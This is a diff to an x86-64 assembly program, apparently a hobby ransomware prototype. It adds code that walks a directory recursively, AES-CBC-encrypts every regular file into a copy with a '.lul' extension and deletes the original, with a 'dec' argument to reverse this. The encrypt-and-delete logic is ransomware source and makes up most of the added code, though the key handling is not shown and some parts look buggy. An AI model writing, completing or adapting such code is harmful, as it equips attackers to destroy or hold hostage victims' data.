@@ -2,18 +2,25 @@
 
 %include "file.asm"
 %include "dir.asm"
+%include "aes.asm"
 ; %include "str.asm"
 
 extern printf
 extern strcmp
+extern strcat
+extern strncpy
 extern sprintf
 extern malloc
 extern free 
-extern AES_init_ctx 
+extern fstat
 
 DIRENT_BUFF_SZ        equ 4096
 
+OP_ENC                equ 0x00
+OP_DEC                equ 0x01
 
+; TODO
+;       FREE ALLOCATED MEMORY
 
 section .data
         openfile_error          db "Failed to open file",0xa,0x00
@@ -23,9 +30,8 @@ section .data
         readdir_error_len       equ $-readdir_error
 
         fmtReadFileFailed       db "Failed to read file '%s' error code %d", 0x0a, 0x00
-        fmtTotalRead            db "Read %d from file", 0x0a, 0x00
-
-        dirpath                 db "/home/frost/asm", 0x00
+ 
+        dirpath                 db "/home/frost/asm/testDir", 0x00
         
         newLine                 db 0xa, 0x00
 
@@ -36,30 +42,58 @@ section .data
         errFailedToMalloc       db "Failed to allocate memory", 0x0a, 0x00
         dotdotDir               db "..", 0x00
         dotDir                  db ".", 0x00
-        delfile                 db "ee.txt", 0x00
+        
+        newExtension            db ".lul", 0x00
+        newExtLen               equ $-newExtension
+
+        op                      db OP_ENC          ;encrypt = 0x00 or decrypt = 0x01
+        decStrArg               db "dec", 0x00   ; argument used to decrypt files
+
+        opFunction              dq AES_CBC_encrypt_buffer
+
+        
+        renameFunction          dq append_ext   ; function used to rename the file
 
 section .bss
-        file_fd                 resq 1
-        fileBuffer              resb BUFF_SZ
+        file_fd                 resq 1          ; fd of the original file
+        file_copy_fd            resq 1          ; fd of the encrypted file
 
+        fileBuffer              resb BUFF_SZ
+        originalFileSz          resq 1
         
         
-global    _start
+global    main
 
 
 section   .text
-_start: 
-
+main:
         push    rbp
         mov     rbp, rsp
+        ; jmp     __Dec
+        
+        cmp     rdi, 0x01
+        je      _start_op
 
-        push    delfile
-        call    delete_file
+        ; check if should enc/decpryt
+        mov     rdi, [rsi + 0x08]
+        mov     rsi, decStrArg
+        call    strcmp
 
-        ; push    dirpath
-        ; call    get_dir_files_rec
+        cmp     rax, 0x00
+        jne     _start_op
 
+__Dec:        ; decrypt
+        mov     BYTE[op], OP_DEC
+        mov     QWORD[opFunction], AES_CBC_decrypt_buffer
+        mov     QWORD[renameFunction], original_filename
+
+_start_op:
+        call    init_aes_ctx
+       
+        push    dirpath
+        call    get_dir_files_rec
         jmp     exit_0
+
 
 get_dir_files_rec:
         ; arguments
@@ -69,10 +103,11 @@ get_dir_files_rec:
         bufferPtr               equ 0x10
         totalDirEntsSize        equ 0x18
         filePath                equ 0x20
+        fileSize                equ 0x28
 
         push    rbp
         mov     rbp, rsp
-        sub     rsp, 0x48
+        sub     rsp, 0x38
 
         ; allocate memory for dirents structs
         mov     rdi, DIRENT_BUFF_SZ
@@ -89,8 +124,6 @@ get_dir_files_rec:
         jz      exit_0
         mov     QWORD[rbp - filePath], rax
 
-
-
         push    DIRENT_BUFF_SZ
         push    QWORD[rbp - bufferPtr]
         push    QWORD[rbp + directory]       ; dir path
@@ -99,23 +132,8 @@ get_dir_files_rec:
         cmp     rax, 0x00
         jg      read_dirent
 
-
-        mov     rdi, fmtDec
-        mov     rsi, rax
-        mov     rax, 0x00
-        call    printf
-
         push    readdir_error_len
         push    readdir_error
-        call    write_stdout
-
-
-        push    QWORD[rbp + directory]
-        call    __strlen
-
-
-        push    rax
-        push    QWORD[rbp + directory]
         call    write_stdout
 
         jmp     _ret_get_dir_files
@@ -152,7 +170,7 @@ read_next_dirent:
 
 
         cmp     BYTE[rbx + DirEnt.d_type], DT_REG
-        je      _print_reg_file
+        je      _read_next_file
 
         push    rsi
         push    rdi
@@ -175,19 +193,8 @@ read_next_dirent:
 
         jmp     _next_offset
 
-_print_reg_file:
-        push    QWORD [rbp - filePath]
-        call    __strlen
-
-        push    rax
-        push    QWORD [rbp - filePath]
-        call    write_stdout
-
-        push    1
-        push    newLine
-        call    write_stdout
-
-        ;; read file content
+_read_next_file:
+        ;; open original file in readonly 
         push    0x00                                    ; no need for permissions
         push    O_RDONLY                                ; open mode
         push    QWORD [rbp - filePath]                            ; file path
@@ -195,26 +202,121 @@ _print_reg_file:
 
         cmp     rax, 0x00
         jle     openfile_failed
-
         mov     QWORD[file_fd], rax
-        xor     r10, r10
 
-        push    BUFF_SZ
-        push    fileBuffer
+        push    QWORD [rbp - filePath]
+        call    [renameFunction]
+
+        push    rax
+
+        mov     rdi, fmtPrintFilename
+        mov     rsi, rax
+        mov     rax, 0x00
+        call    printf
+        ;cmp    rax, 0x00
+        ; ...
+
+        pop     rax
+
+        ; create new file
+        push    rax
+        call    create_file
+
+        cmp     rax, 0x00
+        jle     openfile_failed
+
+        mov     QWORD[file_copy_fd], rax
+        
         push    QWORD[file_fd]
-_read_loop:
-        call    read_file
-        add     r10, rax
+        call    file_size
 
-        cmp     rax, 0x00       
-        jg      _read_loop
+        cmp     rax, 0x00
+        jle     _next_offset
 
-        mov     rdi, fmtTotalRead
-        mov     rsi, r10
+        mov     QWORD[rbp - fileSize], rax
+        lea     r9, [rbp - fileSize]
+
+        cmp     byte[op], OP_DEC
+        je      _read_file_size
+
+        ; save file size
+        
+
+        push    0x08
+        push    r9
+        push    QWORD[file_copy_fd]
+        call    write_file
+        
+
+        mov     rdi, fmtHex
+        mov     rsi, QWORD[r9]
         mov     rax, 0x00
         call    printf
 
+        xor     r10, r10
+        
+        jmp     _read_loop
+
+
+_read_file_size:
+        push    0x08
+        push    r9
         push    QWORD[file_fd]
+        call    read_file
+
+        mov     rdi, fmtHex
+        mov     rsi, QWORD[r9]
+        mov     rax, 0x00
+        call    printf
+
+
+_read_loop:
+        push    BUFF_SZ
+        push    fileBuffer
+        push    QWORD[file_fd]
+        call    read_file
+
+        cmp     rax, 0x00       
+        jle      _close_files
+
+        add     r10, rax
+        
+        push    rax
+        push    r10
+        
+        ; encrypt data
+        mov     rdx, rax
+        mov     rsi, fileBuffer
+        mov     rdi, aesCtx
+        call    [opFunction]
+
+        pop     r10
+        pop     rax
+
+        mov     r12, rax
+
+        push    rax
+        push    fileBuffer      ; buffer
+        push    QWORD[file_copy_fd]             ; new file fd
+        call    write_file
+
+        ; cmp     r10, QWORD[rbp - fileSize]
+        jmp      _read_loop
+
+        ; cmp     r12, 0x00
+        ; jg      _read_loop
+
+_close_files:
+        
+        ; close the original file
+        push    QWORD[file_fd]
+        call    close_file
+
+        push    QWORD[rbp - filePath]
+        call    delete_file
+
+        ; close the encrypted file
+        push    QWORD[file_copy_fd]
         call    close_file
 
 _next_offset:
@@ -272,7 +374,7 @@ write_stdout:
 
         
 
-;;strlen function
+;strlen function
 __strlen:
     push        rbp
     mov         rbp, rsp
@@ -303,3 +405,87 @@ _doneStrLen:
     
     leave                                       ;destroy stackframe
     ret
+
+append_ext:
+        push    rbp
+        mov     rbp, rsp
+
+        ; save pointer to new allocated memory
+        sub     rsp, 0x08
+
+        push    rcx
+        push    rdi
+        push    rsi
+
+        ; get the size of the filename
+        push    QWORD[rbp + 0x10]               ; original filename
+        call    __strlen
+
+        cmp     rax, 0x00
+        je      _append_done
+
+        push    rax
+
+        ; allocate memory
+        lea     rdi, [rax + newExtLen + 1]
+        call    malloc
+
+        cmp     rax, 0x00
+        je      _append_done
+        mov     QWORD[rbp - 0x08], rax
+
+        pop     rcx
+
+        ; copy 'src' to new allocated memory
+        mov     rdi, rax
+        mov     rsi, QWORD[rbp + 0x10]
+
+        rep     movsb
+
+
+        ; append new extension
+        mov     rcx, newExtLen
+        mov     rsi, newExtension
+
+        rep     movsb
+        mov     rax, QWORD[rbp - 0x08]
+
+_append_done:
+
+        pop     rsi
+        pop     rdi
+        pop     rcx
+
+        leave
+        ret
+
+
+
+original_filename:
+        push    rbp
+        mov     rbp, rsp
+        
+        push    QWORD[rbp + 0x10]
+        call    __strlen
+
+        cmp     rax, 0x00
+        je      _ret_original_filename
+
+        push    rax                         ;save string size
+
+        mov     rdi, rax
+        call    malloc
+
+        cmp     rax, 0x00
+        je      _ret_original_filename
+        
+        pop     r11                             ; string size
+
+        mov     rdi, rax                        ; dst
+        mov     rsi, QWORD[rbp + 0x10]          ; src
+        lea     rdx, [r11 - newExtLen+1]      ; length
+        call    strncpy
+
+_ret_original_filename:
+        leave
+        ret
